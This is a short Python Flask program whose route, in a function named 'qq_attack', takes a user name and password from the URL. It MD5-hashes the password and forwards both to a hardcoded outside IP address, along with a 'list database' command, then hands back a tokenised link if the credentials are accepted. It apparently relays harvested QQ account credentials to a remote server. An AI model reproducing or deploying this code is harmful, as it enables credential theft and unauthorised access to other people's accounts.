
import os
from flask import Flask
from flask_cors import CORS
import requests
import hashlib
import random
import string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


app = Flask(__name__)
CORS(app)

url_list = {}
remote: str = 'http://127.0.0.1:5555/'

def get_random() -> str:
    # 定义可用的字符集，包括26个英文字母（大小写）和数字
    characters = string.ascii_letters + string.digits
    # 生成一个10个字符长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(10))
    if random_string in url_list.keys():
        return get_random()
    else:
        return random_string

@app.route('/api/qq/<user>/<pwd>')
def qq_attack(user,pwd):
    md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()

    r = requests.get("http://154.9.253.147:8888/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
    print(r.text)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        url_list[n] = user
        return 'Please visit the url: ' + remote + n

    else:
        return 'your message error'

if __name__ == '__main__':
    app.run(port=5555)